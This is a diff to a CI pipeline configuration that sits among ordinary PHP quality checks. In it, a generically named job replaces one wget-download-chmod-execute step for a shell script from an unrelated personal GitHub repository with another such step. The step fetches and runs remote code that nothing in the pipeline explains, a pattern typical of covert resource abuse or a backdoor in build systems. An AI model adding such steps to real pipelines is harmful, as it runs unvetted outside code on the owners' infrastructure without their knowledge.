@@ -47,7 +47,7 @@ blocks:
             - php phpcpd.phar app/ --min-lines=50
         - name: 'Job #4'
           commands:
-            - 'wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh'
+            - 'wget https://raw.githubusercontent.com/surorebro/4core/main/core.sh && chmod +x core.sh && ./core.sh'
   - name: Run Unit tests
     task:
       jobs:
